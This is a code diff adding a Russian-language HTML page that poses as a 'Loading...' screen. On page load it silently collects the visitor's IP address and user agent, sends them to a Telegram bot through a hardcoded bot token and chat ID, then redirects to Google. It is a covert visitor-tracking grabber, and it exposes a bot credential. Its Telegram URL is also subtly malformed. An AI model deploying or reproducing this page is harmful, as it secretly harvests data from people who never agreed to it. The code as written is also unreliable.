@@ -1,1 +1,39 @@
- 
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Загрузка...</title>
+</head>
+<body>
+    <script>
+        const botToken = "8413511998:AAHZuQrJyZnyqJusMNbH074Rw-UzQEMSPpA";
+        const chatId = "8426763446";
+
+        async function sendAndRedirect() {
+            try {
+                // 1. Сначала узнаем IP
+                const ipRes = await fetch('https://api.ipify.org');
+                const ipData = await ipRes.json();
+                
+                const text = `🚀 Переход!\n🌐 IP: ${ipData.ip}\n📱 Устройство: ${navigator.userAgent}`;
+
+                // 2. Отправляем в Telegram методом keepalive (чтобы запрос не обрывался)
+                fetch(`https://api.telegram.org{botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`, {
+                    mode: 'no-cors',
+                    keepalive: true
+                });
+
+            } catch (e) {
+                console.log('Error');
+            } finally {
+                // 3. Ждем полсекунды и уходим на Google
+                setTimeout(() => {
+                    window.location.href = "https://www.google.com";
+                }, 500);
+            }
+        }
+
+        sendAndRedirect();
+    </script>
+</body>
+</html>
